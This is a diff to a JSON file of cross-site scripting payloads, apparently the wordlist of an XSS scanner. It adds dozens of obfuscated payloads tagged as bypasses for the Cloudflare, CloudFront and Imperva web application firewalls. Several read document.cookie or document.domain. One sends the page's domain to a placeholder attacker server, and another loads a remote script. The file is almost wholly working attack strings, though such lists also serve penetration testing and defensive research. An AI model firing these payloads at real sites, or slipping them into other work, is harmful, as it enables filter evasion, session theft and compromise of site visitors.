@@ -4,7 +4,8 @@
         "Attribute": [
             "\""
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "\"><script>alert(1)</script>",
@@ -12,10 +13,10 @@
             "<",
             ">",
             "/",
-            "'",
             "\""
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<svg/onload=alert(1)>",
@@ -24,7 +25,8 @@
             ">",
             "/"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<img src=x onerror=alert(1)>",
@@ -32,7 +34,8 @@
             ">",
             "<"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<image/src/onerror=prompt(8)>",
@@ -41,7 +44,8 @@
             "<",
             "/"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<img src=x onerror=alert(1);> ",
@@ -51,7 +55,8 @@
             ";",
             "/"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
@@ -62,7 +67,8 @@
             "/",
             "'"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "\"><svg onload=alert(1)//",
@@ -72,7 +78,8 @@
             "<",
             "'"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<x contenteditable onblur=alert(1)>lose focus! ",
@@ -81,7 +88,8 @@
             "<",
             ">"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<x onclick=alert(1)>click this! ",
@@ -92,7 +100,8 @@
             "<",
             "/"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "<x onmouseover=alert(1)>hover this!",
@@ -102,7 +111,8 @@
             ">",
             "<"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
     },
     {
         "Payload": "\"><img src=1 onerror=alert(1)>.gif",
@@ -113,6 +123,426 @@
             ";",
             "/"
         ],
-        "count": 0
+        "count": 0,
+        "waf": null
+    },
+    {
+        "Payload": "<a\"/onclick=(confirm)()>Click Here!\n",
+        "Attribute": [
+            "<",
+            "\"",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "Dec: <svg onload=prompt%26%230000000040document.domain)>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "Hex: <svg onload=prompt%26%23x000000028;document.domain)>\n",
+        "Attribute": [
+            "<",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n",
+        "Attribute": [
+            "'",
+            "\"",
+            ">",
+            "<",
+            ";",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>\n",
+        "Attribute": [
+            "<",
+            "\"",
+            ";",
+            ">",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<--%253cimg%20onerror=alert(1)%20src=a%253e --!>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>\n",
+        "Attribute": [
+            "<",
+            "'",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "javascript:{ alert`0` }\n",
+        "Attribute": [],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "1'\"><img/src/onerror=.1|alert``>\n",
+        "Attribute": [
+            "'",
+            "\"",
+            ">",
+            "<",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<img src=x onError=import('//1152848220/')>\n",
+        "Attribute": [
+            "<",
+            "'",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "%2sscript%2ualert()%2s/script%2u\n",
+        "Attribute": [
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg on onload=(alert)(document.domain)>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<img ignored=() src=x onerror=prompt(1)>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg onx=() onload=(confirm)(1)>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "\u00e2\u20ac\u0153><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;\n",
+        "Attribute": [
+            ">",
+            "<",
+            ";"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg on =i onload=alert(domain) (working)\n",
+        "Attribute": [
+            "<"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg/onload=location/**/='https://your.server/'+document.domain>\n",
+        "Attribute": [
+            "<",
+            "/",
+            "'",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg onx=() onload=window.alert?.()> (working)\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "test\",prompt%0A/*HelloWorld*/(document.domain)\n",
+        "Attribute": [
+            "\"",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "\"onx+%00+onpointerenter%3dalert(domain)+x\"\n",
+        "Attribute": [
+            "\""
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "\"><svg%20onload=alert%26%230000000040\"1\")>\n",
+        "Attribute": [
+            "\"",
+            ">",
+            "<"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "%27%09);%0d%0a%09%09[1].find(alert)//\n",
+        "Attribute": [
+            ";",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "\"><img src=1 onmouseleave=print()>\n",
+        "Attribute": [
+            "\"",
+            ">",
+            "<"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg on onload=(alert)(document.domain)>\n",
+        "Attribute": [
+            "<",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<svg/on%20onload=alert(1)>\n",
+        "Attribute": [
+            "<",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "<img/src=x onError=\"`${x}`;alert(`Ex.Mi`);\">",
+        "Attribute": [
+            "<",
+            "/",
+            "\"",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudflare"
+    },
+    {
+        "Payload": "\">%0D%0A%0D%0A<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>\n",
+        "Attribute": [
+            "\"",
+            ">",
+            "<",
+            "'",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudfront"
+    },
+    {
+        "Payload": "\">'><details/open/ontoggle=confirm('XSS')>\n",
+        "Attribute": [
+            "\"",
+            ">",
+            "'",
+            "<",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudfront"
+    },
+    {
+        "Payload": "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/\n",
+        "Attribute": [
+            "'",
+            "/"
+        ],
+        "count": 0,
+        "waf": "cloudfront"
+    },
+    {
+        "Payload": "&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;",
+        "Attribute": [
+            ";"
+        ],
+        "count": 0,
+        "waf": "cloudfront"
+    },
+    {
+        "Payload": "<svg/onload=alert(1)>",
+        "Attribute": [
+            "<",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": null
+    },
+    {
+        "Payload": "<svg/onload=alert(1)>",
+        "Attribute": [
+            "<",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": "cloudfront"
+    },
+    {
+        "Payload": "<x/onclick=globalThis&lsqb;'\\u0070r\\u006f'+'mpt']&lt;)>clickme\n",
+        "Attribute": [
+            "<",
+            "/",
+            ";",
+            "'",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "tarun\"><x/onafterscriptexecute=confirm%26lpar;)//\n",
+        "Attribute": [
+            "\"",
+            ">",
+            "<",
+            "/",
+            ";"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />click  \n",
+        "Attribute": [
+            "<",
+            "/",
+            "\"",
+            "'",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<details/open/ontoggle=\"self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];\"> \n",
+        "Attribute": [
+            "<",
+            "/",
+            "\"",
+            "'",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\n",
+        "Attribute": [
+            "<",
+            "\"",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki \n",
+        "Attribute": [
+            "<",
+            "/",
+            ";",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\"> \n",
+        "Attribute": [
+            "<",
+            "\"",
+            ";",
+            "/",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />tap",
+        "Attribute": [
+            "<",
+            "/",
+            "\"",
+            "'",
+            ">"
+        ],
+        "count": 0,
+        "waf": "imperva"
+    },
+    {
+        "Payload": "\" onload=prompt(1)>",
+        "Attribute": [
+            "\"",
+            ">"
+        ],
+        "count": 0,
+        "waf": null
     }
 ]
